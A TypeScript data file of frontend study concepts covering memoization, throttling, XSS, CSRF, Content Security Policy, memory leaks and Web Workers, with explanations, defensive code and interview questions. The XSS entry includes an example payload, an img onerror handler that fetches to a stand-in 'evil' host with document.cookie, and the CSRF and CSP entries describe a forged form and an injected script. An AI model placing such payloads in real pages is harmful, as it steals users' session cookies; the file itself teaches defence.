import type { Concept } from './schema';

/**
 * Memoization, throttling, frontend security and browser-internals concepts.
 * Original explanations, checked on 2026-11-26 against the pages referenced by `docSourceIds`
 * (OWASP Cheat Sheet Series, MDN, web.dev, Chrome DevTools docs, react.dev).
 * Code fences use `~~~` so the markdown can live inside template literals.
 */
export const SECURITY_BROWSER_CONCEPTS: Concept[] = [
  {
    id: 'memoization',
    title: 'Memoization: caching results by input',
    area: 'Performance',
    summary: 'Memoization stores a function\'s result per input so repeated calls skip the work. It is only correct for pure functions and only faster when the work costs more than computing and storing the key.',
    definition: `**Memoization** caches the output of a function keyed by its inputs. A later call with the same key returns the cached value instead of recomputing. In JavaScript the cache is usually a \`Map\` held in a closure; in React, \`useMemo\` and \`memo\` are single-entry memoization per component instance.`,
    whyItExists: `Some work is expensive and repeats with the same inputs: parsing, formatting large lists, recursive sub-problems, network requests for the same id. Caching turns repeated O(work) calls into O(1) lookups and lets concurrent callers share one in-flight request.`,
    mechanism: `- **Key**: by default the first argument (lodash) or a resolver that builds a key from all arguments. Map keys use SameValueZero: objects compare **by identity**, NaN equals NaN.
- **Lookup**: \`cache.has(key)\` — not truthiness — so cached \`undefined\`/\`0\` are hits.
- **Store after success**: a throwing call caches nothing. For promises, store the in-flight promise (dedupe) and evict it on rejection.
- **Bounding**: an unbounded cache grows with every distinct key. Use LRU (Map insertion order), TTL, single-entry (memoizeOne) or a WeakMap keyed by objects.
- **React**: \`useMemo(fn, deps)\` keeps one value per component and recomputes when a dependency changes by \`Object.is\`; \`memo(Component)\` skips re-rendering when every prop is \`Object.is\`-equal; \`useCallback\` caches a function reference (it does not stop the function being created).`,
    example: `A recruiter dashboard formats 5,000 candidate rows on every keystroke in an unrelated search box. Memoizing the formatter by row id removes the repeated work; memoizing the search fetcher by query dedupes identical requests.`,
    codeWalkthrough: `~~~js
function memoize(fn, resolver) {
  const cache = new Map();
  return function memoized(...args) {
    const key = resolver ? resolver.apply(this, args) : args[0];
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args); // throws → nothing cached
    cache.set(key, result);
    if (result && typeof result.then === 'function') {
      result.then(undefined, () => { if (cache.get(key) === result) cache.delete(key); });
    }
    return result;
  };
}
~~~
The closure gives each memoized function a private cache. \`has\` separates "missing" from "cached falsy". The rejection handler stops a transient network error from being cached forever.`,
    misconceptions: [
      'Memoization always makes code faster — computing keys, storing results and extra GC pressure can cost more than cheap work.',
      'Two equal-looking objects hit the same cache entry — Map and React compare objects by identity.',
      '`useCallback` prevents a function from being created — it only returns the previous reference when dependencies are unchanged.',
    ],
    failureCases: [
      'Memoizing an impure function (reads Date.now(), mutable globals) returns stale results.',
      'An unbounded cache keyed by user input leaks memory in a long-lived SPA.',
      'Caching a rejected promise makes a temporary failure permanent.',
    ],
    productionImplications: `Measure before memoizing. In React, memoization only helps when the memoized child or effect actually depends on the stable value — one inline object prop defeats \`memo\`. React Compiler automates most component-level memoization; for data, prefer a query cache (staleTime, invalidation, dedupe) over hand-written memoized fetchers.`,
    docSourceIds: ['react-usecallback', 'react-memo', 'mdn-map'],
    interviewQuestions: [
      'Implement a generic memoize with a resolver. How do you handle async functions?',
      'When can memoization make performance worse?',
      'React.memo vs useMemo vs useCallback: what does each cache and when does it help?',
    ],
    related: ['closures', 'referential-equality', 'react-performance', 'memory-leaks'],
  },
  {
    id: 'throttling',
    title: 'Throttling: at most once per interval',
    area: 'Performance',
    summary: 'Throttle guarantees a function runs at most once per `wait` ms during continuous activity — usually immediately on the first call and once more at the end of the window with the latest arguments.',
    definition: `A **throttled** function runs at most once per window. With leading + trailing behaviour (the lodash default), the first call runs immediately and opens a window; calls during the window are collapsed into one trailing call with the **latest** arguments when the window ends, and that trailing call opens a new window. Compare **debounce**, which waits until calls stop for \`wait\` ms.`,
    whyItExists: `Scroll, resize, pointermove and drag fire dozens of events per second. Handling every one wastes main-thread time and hurts responsiveness; handling only the last one (debounce) gives no feedback during the gesture. Throttle bounds both work and latency.`,
    mechanism: `- State: a timer id (window open?) and the pending args/\`this\`.
- Idle call → start timer, call fn. Call during window → overwrite pending args.
- Timer fires → if pending, call fn with it and restart the timer; else go idle.
- \`cancel()\` clears the timer and pending args (call it on unmount).
- For visual work, \`requestAnimationFrame\` is a natural throttle aligned to paint; IntersectionObserver/ResizeObserver often remove the need for scroll/resize listeners.`,
    example: `A sticky "Apply now" bar shows after the user scrolls past the job summary. A throttled scroll handler updates it every 100 ms and always processes the final position; an IntersectionObserver on the summary removes the listener entirely.`,
    codeWalkthrough: `~~~js
function throttle(fn, wait) {
  let timer = null, pendingArgs = null, pendingThis = null;
  const end = () => {
    if (pendingArgs) { const a = pendingArgs, t = pendingThis; pendingArgs = pendingThis = null; timer = setTimeout(end, wait); fn.apply(t, a); }
    else timer = null;
  };
  function throttled(...args) {
    if (timer === null) { timer = setTimeout(end, wait); fn.apply(this, args); }
    else { pendingArgs = args; pendingThis = this; }
  }
  throttled.cancel = () => { clearTimeout(timer); timer = null; pendingArgs = pendingThis = null; };
  return throttled;
}
~~~
The window opens before fn runs, so re-entrant calls are throttled too; the trailing call restarts the window to keep the at-most-once guarantee.`,
    misconceptions: [
      'Throttle and debounce are interchangeable — debounce delays until quiet, throttle emits during activity.',
      'A timestamp check is a complete throttle — it drops the final call, so the last scroll position can be missed.',
    ],
    failureCases: [
      'Leading-only throttle leaves UI showing a stale position after the gesture ends.',
      'Not reopening the window after the trailing call lets fn run twice within `wait`.',
      'Creating a new throttled function on every React render resets its state each time.',
    ],
    productionImplications: `In React keep one instance per component (\`useMemo\`/\`useRef\`), read the latest props through a ref, and cancel in effect cleanup. Mark scroll listeners \`{ passive: true }\`. Background tabs throttle timers, so trailing calls can arrive late.`,
    docSourceIds: ['mdn-debounce', 'mdn-settimeout', 'mdn-intersection-observer'],
    interviewQuestions: [
      'Implement throttle with leading and trailing calls and cancel().',
      'Debounce vs throttle: give one UI example where each is correct.',
      'When is requestAnimationFrame or an observer better than throttle?',
    ],
    related: ['debouncing', 'closures', 'this-binding', 'fake-timers'],
  },
  {
    id: 'xss-prevention',
    title: 'XSS: output encoding, sanitization and dangerous sinks',
    area: 'Security',
    summary: 'Cross-site scripting happens when attacker-controlled data reaches a sink that executes it. React escapes text by default; the risks are escape hatches like dangerouslySetInnerHTML, URL attributes, and direct DOM sinks. Sanitize HTML with DOMPurify and add CSP / Trusted Types as defence in depth.',
    definition: `**Cross-site scripting (XSS)** is injection of script into a page through untrusted data. **Stored** XSS comes from saved content (a job description, a candidate note), **reflected** from the request (a query parameter), and **DOM-based** from client-side code moving data into a sink (\`innerHTML\`, \`location\`, \`eval\`) without going through the server.`,
    whyItExists: `A script running in your origin can read everything the user can: DOM data, non-HttpOnly cookies, tokens in storage, and it can make authenticated requests. OWASP notes XSS defeats every CSRF defence, so it is the most important frontend vulnerability to prevent.`,
    mechanism: `- **Context-aware encoding**: React JSX text and attribute values are escaped automatically, so \`{job.title}\` cannot inject markup.
- **Escape hatches**: \`dangerouslySetInnerHTML={{ __html }}\`, \`ref.current.innerHTML\`, \`insertAdjacentHTML\`, \`document.write\`, \`eval\`/\`new Function\`, string \`setTimeout\`. OWASP lists \`dangerouslySetInnerHTML\` without sanitizing as a framework escape hatch.
- **URLs**: \`href={userUrl}\` can carry \`javascript:\`. React 19 blocks \`javascript:\` URLs in \`src\`/\`href\`, but OWASP says this "does not replace application-specific URL validation" — allowlist \`https:\`/\`mailto:\` by parsing with \`new URL()\`.
- **Sanitize rich HTML** with an allowlist sanitizer — OWASP recommends **DOMPurify** — right before rendering, on the client that renders it.
- **Defence in depth**: a strict, nonce-based **CSP** blocks injected scripts that slip through; **Trusted Types** (\`require-trusted-types-for\`) makes string assignment to injection sinks throw, forcing all HTML through a reviewed policy.`,
    example: `A recruiter pastes a job description from Word into a rich text editor. It is stored as HTML and rendered on the public job page. Without sanitization, \`<img src=x onerror="fetch('//evil?c='+document.cookie)">\` runs for every candidate who views the job.`,
    codeWalkthrough: `~~~tsx
import DOMPurify from 'dompurify';

function JobDescription({ html }: { html: string }) {
  const clean = useMemo(
    () => DOMPurify.sanitize(html, { ALLOWED_TAGS: ['p', 'ul', 'ol', 'li', 'strong', 'em', 'a', 'h2', 'h3', 'br'], ALLOWED_ATTR: ['href'] }),
    [html],
  );
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
}

function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw, window.location.origin);
    return ['https:', 'mailto:'].includes(url.protocol) ? url.href : undefined;
  } catch { return undefined; }
}
~~~
Sanitize at render time with a tag/attribute allowlist, and validate URLs by parsed protocol rather than by string matching.`,
    misconceptions: [
      'React makes XSS impossible — it escapes text, but dangerouslySetInnerHTML, href/src URLs and direct DOM access are still sinks.',
      'Sanitizing once on input is enough — the same data can reach new sinks later; sanitize for the context where it is rendered.',
      'A regex that strips <script> tags is a sanitizer — event handler attributes, SVG and malformed markup bypass it.',
    ],
    failureCases: [
      'Rendering markdown-to-HTML output or a CMS field with dangerouslySetInnerHTML without sanitizing.',
      'Building `href` from a user profile "website" field without a protocol allowlist.',
      'Server-rendering JSON into a <script> tag without escaping `</script>`.',
    ],
    productionImplications: `Wrap every HTML sink in one reviewed component (e.g. \`<SafeHtml>\`) and lint against raw \`dangerouslySetInnerHTML\`. Deploy a nonce-based CSP in Report-Only mode first, then enforce. Treat third-party scripts and browser extensions as part of your attack surface; in healthcare products, an XSS is a data-breach incident.`,
    docSourceIds: ['owasp-xss', 'react-dom-common', 'mdn-trusted-types'],
    interviewQuestions: [
      'How would you safely render recruiter-authored HTML in a job description?',
      'Does React prevent XSS? Where does it not?',
      'What is DOM-based XSS and how do Trusted Types help?',
    ],
    related: ['content-security-policy', 'csrf-cookies'],
  },
  {
    id: 'csrf-cookies',
    title: 'CSRF, cookies and where to keep auth tokens',
    area: 'Security',
    summary: 'CSRF tricks a logged-in browser into sending an authenticated request it did not intend. Cookie-based sessions need CSRF defences (tokens, Fetch Metadata, SameSite as an extra layer); tokens in JavaScript storage avoid CSRF but are exposed to XSS.',
    definition: `**Cross-site request forgery (CSRF)** abuses the fact that browsers attach cookies to requests automatically. A page on \`evil.example\` submits a form to \`app.example/api/candidates/42/reject\`; if the session cookie is sent, the server sees a valid user. CSRF needs **ambient credentials** (cookies, HTTP auth) — a bearer token the app adds manually is not sent by a cross-site form.`,
    whyItExists: `Cookies were designed to be sent with every request to their site. Without extra checks, the server cannot tell a request the user made in your UI from one another site caused.`,
    mechanism: `- **Cookie attributes** (MDN): \`HttpOnly\` hides the cookie from \`document.cookie\` (still sent with fetch/XHR); \`Secure\` sends it only over HTTPS; \`SameSite=Lax|Strict|None\` limits cross-site sending — MDN notes only that "some browsers use Lax as the default", so set it explicitly. The \`__Host-\` prefix requires Secure, no Domain and \`Path=/\`.
- **OWASP defences**: the **synchronizer token** pattern (server-issued token checked on state-changing requests), the **signed double-submit cookie** (the naive unsigned version is discouraged), **custom request headers** for API calls (cross-site forms cannot set them without a CORS preflight), and **Fetch Metadata** — \`Sec-Fetch-Site\` as a primary signal with Origin/Referer verification as fallback.
- **State-changing requests must not be GET.**
- **XSS defeats all of these** (OWASP): script in your origin can read the token and send the request itself.
- **Token storage trade-off**: localStorage tokens are readable by any XSS; HttpOnly cookies are not readable but need CSRF protection. A common pattern is an HttpOnly, Secure, SameSite session cookie plus a CSRF token or Fetch Metadata check, with short-lived access tokens kept in memory only.`,
    example: `A recruiter is logged into the ATS. An email links to a page that auto-submits \`<form action="https://ats.example/api/offers" method="POST">\`. With a SameSite=Lax cookie the cross-site POST carries no cookie; with a CSRF token check it fails even on older browsers; with \`Sec-Fetch-Site: cross-site\` the server rejects it outright.`,
    codeWalkthrough: `~~~ts
// Server (pseudo-Express): reject cross-site state-changing requests
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const site = req.get('Sec-Fetch-Site');
  if (site && site !== 'same-origin') return res.status(403).end();
  if (!site && req.get('Origin') !== 'https://ats.example') return res.status(403).end();
  if (req.get('X-CSRF-Token') !== req.session.csrfToken) return res.status(403).end();
  next();
});

// Client: send the token in a header the browser will not add cross-site
await fetch('/api/offers', { method: 'POST', credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken }, body });
~~~
Fetch Metadata stops most cross-site requests cheaply; the token is the per-session proof the request came from your UI.`,
    misconceptions: [
      'SameSite cookies make CSRF tokens unnecessary — treat SameSite as defence in depth; same-site subdomains and older browsers still matter.',
      'CORS prevents CSRF — CORS controls reading responses; a simple cross-site form POST is still sent.',
      'HttpOnly cookies protect against XSS — they hide the cookie value, but injected script can still make authenticated requests.',
    ],
    failureCases: [
      'A state-changing GET endpoint (`/candidates/42/delete`) triggered by an <img> tag.',
      'Storing a long-lived refresh token in localStorage, stolen by one XSS.',
      'Accepting `text/plain` POSTs without a token because "our API only takes JSON".',
    ],
    productionImplications: `Decide token storage with the security team and document it: HttpOnly + Secure + SameSite session cookies, \`__Host-\` prefix, CSRF token or Fetch Metadata on every mutation, short access-token lifetimes, and logout that invalidates server sessions. For multi-tenant SaaS, scope cookies to the app host, never to a shared parent domain.`,
    docSourceIds: ['owasp-csrf', 'mdn-set-cookie'],
    interviewQuestions: [
      'Where would you store auth tokens in a React SPA and why?',
      'Explain CSRF and three ways to prevent it.',
      'Does SameSite=Lax fully solve CSRF? Does CORS?',
    ],
    related: ['xss-prevention', 'content-security-policy'],
  },
  {
    id: 'content-security-policy',
    title: 'Content Security Policy, clickjacking and Trusted Types',
    area: 'Security',
    summary: 'CSP is a response header that tells the browser which scripts, frames and other resources may load. A strict nonce-based policy blocks injected scripts; frame-ancestors stops clickjacking; Trusted Types locks down DOM XSS sinks.',
    definition: `**Content-Security-Policy** is an HTTP response header listing allowed sources per resource type. web.dev recommends a **strict, nonce-based** policy:

~~~
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
~~~
Only scripts carrying the per-response nonce run; \`'strict-dynamic'\` lets those scripts load further scripts.`,
    whyItExists: `Escaping and sanitization can have bugs. CSP is a second layer: even if markup is injected, the browser refuses to execute scripts without the nonce. Host allowlists (\`script-src cdn.example\`) are easy to bypass through JSONP or hosted libraries, which is why nonces are preferred.`,
    mechanism: `- **Nonce**: generated fresh for every response (web.dev: ideally 128+ bits) and added to every legitimate \`<script nonce>\`. Inline event handlers (\`onclick="…"\`) are blocked.
- **\`object-src 'none'\`** blocks plugins; **\`base-uri 'none'\`** stops \`<base>\` injection from redirecting relative script URLs.
- **Rollout**: send \`Content-Security-Policy-Report-Only\` first, collect violations, fix them, then enforce.
- **Clickjacking**: \`frame-ancestors 'none'\` (MDN: unless your site must be embeddable) stops other sites framing your app; it replaces \`X-Frame-Options\`.
- **Trusted Types**: \`require-trusted-types-for 'script'\` makes assigning a plain string to \`innerHTML\` and other sinks throw a TypeError unless it came from a registered policy (MDN: Baseline 2026).
- **SSR frameworks** need to inject the nonce into their own script tags (e.g. read it from a request header in middleware).`,
    example: `A healthcare portal sets a nonce-based CSP. An attacker stores \`<script>steal()</script>\` in a patient note; the sanitizer misses a variant, but the browser blocks the script because it lacks the nonce and reports the violation.`,
    codeWalkthrough: `~~~ts
// Middleware: one nonce per response, passed to the renderer
export function middleware(req: Request) {
  const nonce = btoa(String.fromCharCode(...crypto.getRandomValues(new Uint8Array(16)))); // 128 bits
  const csp = [
    \`script-src 'nonce-\${nonce}' 'strict-dynamic'\`,
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'",
    "require-trusted-types-for 'script'",
  ].join('; ');
  const res = renderApp({ nonce }); // every <script> tag gets nonce={nonce}
  res.headers.set('Content-Security-Policy-Report-Only', csp); // switch to enforcing after review
  return res;
}
~~~
Start in Report-Only, fix violations (inline handlers, third-party tags), then enforce.`,
    misconceptions: [
      'CSP replaces escaping and sanitization — it is defence in depth; injected HTML can still deface pages or exfiltrate via allowed channels.',
      "'unsafe-inline' with a nonce is pointless — modern browsers ignore 'unsafe-inline' when a nonce is present, so it serves as an old-browser fallback.",
      'A static nonce is fine — a reused nonce can be copied into injected markup.',
    ],
    failureCases: [
      'Caching HTML at a CDN with a fixed nonce, so every user shares the same nonce.',
      'Allowlisting a broad CDN host that serves user-uploadable or JSONP scripts.',
      'Enforcing CSP without a Report-Only phase and breaking analytics, payments or chat widgets.',
    ],
    productionImplications: `Own the CSP as code with tests, send reports to an endpoint you monitor, and review every third-party script request. Combine with \`frame-ancestors\`, HSTS and Trusted Types for SOC 2-style hardening.`,
    docSourceIds: ['webdev-strict-csp', 'mdn-csp', 'mdn-trusted-types'],
    interviewQuestions: [
      'Write a strict CSP for a React SPA and explain each directive.',
      'How do you roll out CSP without breaking production?',
      'How do you prevent clickjacking?',
    ],
    related: ['xss-prevention', 'csrf-cookies'],
  },
  {
    id: 'memory-leaks',
    title: 'Memory leaks and garbage collection in the browser',
    area: 'Performance',
    summary: 'JavaScript memory is reclaimed when objects become unreachable from roots. Leaks are references you forgot: listeners, timers, caches, closures and detached DOM nodes. Find them with heap snapshots, the allocation timeline and the Detached elements tool.',
    definition: `Browsers use **reachability-based garbage collection**: anything reachable from roots (globals, the current stack, active closures, the DOM tree, pending callbacks) stays alive; everything else is eventually collected (mark-and-sweep, generational in V8). A **leak** is memory that stays reachable although the app no longer needs it. Chrome DevTools defines a **detached** node as one "removed from the DOM tree but some JavaScript still references it".`,
    whyItExists: `SPAs live for hours — a recruiter keeps the ATS open all day. Small per-navigation leaks add up to hundreds of MB, causing jank from frequent GC and eventually tab crashes.`,
    mechanism: `- **Common leaks**: event listeners on \`window\`/\`document\` not removed on unmount; \`setInterval\` never cleared; subscriptions (WebSocket, store) not unsubscribed; unbounded caches/Maps keyed by ids; closures capturing large objects; detached DOM held by a variable or a third-party widget.
- **WeakMap / WeakRef**: a WeakMap does not keep its keys alive, so metadata keyed by objects disappears with them; it is not iterable.
- **Tools** (Chrome DevTools): **Task Manager** (memory footprint / JS memory per tab), the **Performance** panel with Memory enabled (a rising sawtooth that never returns to baseline), **heap snapshots** (compare before/after an action, filter "Detached"), **Allocations on timeline** (which function allocated what survived), allocation sampling, and the **Detached elements** profile.
- **Workflow**: reproduce (open/close a modal 10×), force GC, snapshot, repeat, compare; follow the retainers path to the root holding the object.`,
    example: `Opening and closing a candidate drawer 20 times grows the heap by 40 MB. A comparison snapshot shows 20 detached \`<div class="drawer">\` trees retained by a resize listener registered in \`useEffect\` without cleanup.`,
    codeWalkthrough: `~~~tsx
useEffect(() => {
  const onResize = () => setWidth(drawerRef.current!.offsetWidth);
  window.addEventListener('resize', onResize);
  const id = setInterval(pollStatus, 5000);
  const unsubscribe = store.subscribe(sync);
  return () => {                      // without this, each mount leaks:
    window.removeEventListener('resize', onResize); // closure → drawerRef → detached DOM
    clearInterval(id);
    unsubscribe();
  };
}, []);
~~~
Every subscription created in an effect needs a matching cleanup; an AbortController's signal can remove many listeners at once.`,
    misconceptions: [
      'Garbage-collected languages cannot leak — anything still referenced stays alive.',
      'Closures always leak — a closure only retains memory while the closure itself is reachable.',
      'WeakMap is a faster Map — it exists for lifetime semantics, and cannot be iterated or sized.',
    ],
    failureCases: [
      'A global `Map` cache keyed by search query that is never evicted.',
      'A chart library instance not destroyed on unmount, retaining canvases and data.',
      'Console-logging large objects in production builds (DevTools keeps them alive while open).',
    ],
    productionImplications: `Add a "mount/unmount 20×" memory check for heavy views, track \`performance.memory\`-style signals or crash rates where available, bound every cache, and review effects for cleanup in code review. In React, StrictMode's double-invoked effects surface missing cleanups in development.`,
    docSourceIds: ['chrome-memory-problems', 'mdn-map', 'react-useeffect'],
    interviewQuestions: [
      'How does garbage collection work in JavaScript?',
      'How can closures contribute to memory leaks?',
      'Walk me through finding a memory leak in a React app with DevTools.',
    ],
    related: ['closures', 'react-effects', 'memoization', 'web-workers'],
  },
  {
    id: 'web-workers',
    title: 'Web Workers, transferables and WebAssembly off the main thread',
    area: 'DOM & Browser',
    summary: 'A Web Worker runs JavaScript on a background thread with no DOM access, talking to the page via postMessage. Use it for CPU-heavy work (parsing, search indexing, image processing); transfer ArrayBuffers instead of copying them.',
    definition: `A **dedicated Worker** (\`new Worker(url, { type: 'module' })\`) runs a script in its own global scope and thread. It cannot touch the DOM; it communicates with the page by \`postMessage\`, which copies data with the **structured clone** algorithm, or **transfers** ownership of transferable objects. **WebAssembly** modules can run in workers for near-native compute (e.g. PDF parsing, compression).`,
    whyItExists: `The main thread does rendering, input handling and your JavaScript. A 300 ms CSV parse blocks clicks and scrolling and shows up as poor INP. Moving pure computation to a worker keeps the UI responsive.`,
    mechanism: `- **Messaging**: \`worker.postMessage(data, transferList)\`; the worker replies with \`self.postMessage\`. Messages are asynchronous events — wrap them in a promise with a request id (or use a library such as Comlink).
- **Structured clone** copies objects, Maps, Dates, typed arrays; it cannot clone functions or DOM nodes.
- **Transferables** (MDN): ArrayBuffer, MessagePort, ImageBitmap, OffscreenCanvas, streams and more. After transfer the original is unusable — an ArrayBuffer's \`byteLength\` becomes 0. Typed arrays themselves are not transferable; transfer their \`.buffer\`.
- **Costs**: worker start-up and message serialization; not worth it for tasks under a few milliseconds.
- **Alternatives**: chunk work with \`scheduler.yield()\`/\`setTimeout\`, \`useTransition\`/\`useDeferredValue\` for rendering work (they do not make computation cheaper), or move work to the server.`,
    example: `A recruiter imports a 20 MB CSV of candidates. Parsing and validating it on the main thread freezes the page for 2 s. A worker parses it in chunks and posts progress; the main thread only renders the progress bar and the first page of results.`,
    codeWalkthrough: `~~~ts
// main.ts
const worker = new Worker(new URL('./csv.worker.ts', import.meta.url), { type: 'module' });
export async function parseCsv(file: File): Promise<Candidate[]> {
  const buffer = await file.arrayBuffer();
  return new Promise((resolve, reject) => {
    worker.onmessage = (e) => (e.data.error ? reject(e.data.error) : resolve(e.data.rows));
    worker.postMessage({ buffer }, [buffer]); // transfer: no copy, buffer.byteLength is now 0 here
  });
}

// csv.worker.ts
self.onmessage = (e: MessageEvent<{ buffer: ArrayBuffer }>) => {
  const text = new TextDecoder().decode(e.data.buffer);
  self.postMessage({ rows: parseAndValidate(text) });
};
~~~
Transferring the buffer avoids copying 20 MB; a production version adds request ids, progress messages and termination on cancel.`,
    misconceptions: [
      'Workers make code faster — they make the main thread free; total CPU work is the same plus messaging overhead.',
      'useTransition moves work off the main thread — it only makes React rendering interruptible.',
      'You can share objects by reference between threads — only SharedArrayBuffer (cross-origin isolated) shares memory; everything else is copied or transferred.',
    ],
    failureCases: [
      'Posting a huge object graph every frame, so cloning costs more than the work saved.',
      'Reading a transferred ArrayBuffer on the main thread and getting an empty buffer.',
      'Creating a new worker per task without terminating it, leaking threads and memory.',
    ],
    productionImplications: `Profile first (Performance panel long tasks, INP). Keep a worker pool for repeated jobs, terminate on route change, bundle workers with the build tool's worker support, and send errors back as messages so they reach your error monitoring.`,
    docSourceIds: ['mdn-transferable', 'mdn-structuredclone', 'mdn-postmessage'],
    interviewQuestions: [
      'When would you use a Web Worker in a React app?',
      'What is the difference between copying and transferring data to a worker?',
      'Where does WebAssembly fit in a frontend architecture?',
    ],
    related: ['event-loop', 'react-performance', 'memory-leaks'],
  },
];
